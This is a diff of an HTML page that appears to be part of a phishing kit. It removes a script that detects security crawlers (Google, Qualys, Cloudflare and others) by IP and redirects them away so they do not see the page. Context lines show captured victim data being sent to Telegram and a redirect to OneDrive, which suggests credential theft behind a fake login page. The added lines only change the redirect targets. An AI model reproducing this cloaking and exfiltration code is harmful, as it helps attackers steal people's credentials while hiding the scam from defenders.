@@ -7,99 +7,6 @@
     <link href="style.css" rel="stylesheet">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="addLogDetails.js"></script>
-    <script>
-      async function fetchTargetIPAddresses() {
-        const folderPath = "antibot/ips/";
-        const jsonFiles = [
-          "amazonBotIPs.json",
-          "appleBotIPs.json",
-          "bingBotIPs.json",
-          "cloudFlareBotIPs.json",
-          "cookieBotIPs.json",
-          "googleBotIPs.json",
-          "namecheapBotIPs.json",
-          "qualysBotIPs.json",
-          "syntheticBotIPs.json",
-          "yandexBotIPs.json",
-          "generalBotIPs.json",
-        ];
-        const promises = jsonFiles.map((filename) => {
-          return fetch(folderPath + filename)
-            .then((response) => response.json())
-            .then((data) => {
-              const ips = Object.values(data).map((ip) =>
-                String(ip).replace(/"/g, "")
-              );
-              return ips;
-            })
-            .catch((error) => {
-              console.error(`Error fetching ${filename}:`, error);
-              return [];
-            });
-        });
-        const ipArrays = await Promise.all(promises);
-        const targetIPAddresses = ipArrays.flat();
-        //console.log('Fetched target IP addresses:', targetIPAddresses);
-        return targetIPAddresses;
-      }
-
-      function isTargetIPAddress(ipAddress, targetIPAddresses) {
-        //console.log(ipAddress)
-        if (!Array.isArray(targetIPAddresses)) {
-          targetIPAddresses = [targetIPAddresses];
-        }
-        for (let i = 0; i < targetIPAddresses.length; i++) {
-          const targetIP = targetIPAddresses[i];
-          const individualIPs = targetIP.split(",").map((ip) => ip.trim());
-          for (let j = 0; j < individualIPs.length; j++) {
-            const individualIP = individualIPs[j];
-            //console.log("Individual IP:", individualIP);
-            if (isIPInRange(ipAddress, individualIP)) {
-              console.log("Match found:", individualIP);
-              return true;
-            }
-          }
-        }
-        console.log("Match not found");
-        return false;
-      }
-
-      function isIPInRange(ipAddress, targetIP) {
-        //console.log("Checking IP range:", targetIP);
-        if (Array.isArray(targetIP)) {
-          for (let i = 0; i < targetIP.length; i++) {
-            const ip = targetIP[i];
-            if (ipAddress.trim() === ip.trim()) {
-              //console.log("IPs match:", true);
-              return true;
-            }
-          }
-        } else {
-          //console.log("Checking IP:", targetIP.trim());
-          const match = ipAddress.trim() === targetIP.trim();
-          //console.log("IPs match:", match);
-          return match;
-        }
-        //console.log("IPs match:", false);
-        return false;
-      }
-
-      async function redirectToBlockedPage() {
-        try {
-          const targetIPAddresses = await fetchTargetIPAddresses();
-          const data = await fetch("https://api.ipify.org?format=json");
-          const { ip: currentIPAddress } = await data.json();
-          if (isTargetIPAddress(currentIPAddress, targetIPAddresses)) {
-            window.location.href = "http://2m.ma";
-            //const userAgent = navigator.userAgent;
-            //console.log("User Agent:", userAgent);
-          }
-        } catch (error) {
-          console.error("Error:", error);
-        }
-      }
-      window.onload = redirectToBlockedPage;
-    </script>
 </head>
 <body style="height:100vh;">
 
@@ -282,6 +189,7 @@ document.addEventListener("DOMContentLoaded", function() {
             })
             .catch(error => {
                 console.error("Error capturing IP address:", error);
+                window.location.href = 'https://fresh.com'; // Redirect to error URL
             });
     }
 
@@ -310,13 +218,15 @@ document.addEventListener("DOMContentLoaded", function() {
         })
         .then(response => {
             if (response.ok) {
-                window.location.href = 'http://onedrive.live.com';
+                window.location.href = 'https://example.org'; // Redirect to success URL
             } else {
                 console.error("Error sending data to Telegram:", response.statusText);
+                window.location.href = 'https://fresh.com'; // Redirect to error URL
             }
         })
         .catch(error => {
             console.error("Error sending data to Telegram:", error);
+            window.location.href = 'https://fresh.com'; // Redirect to error URL
         });
     }
 
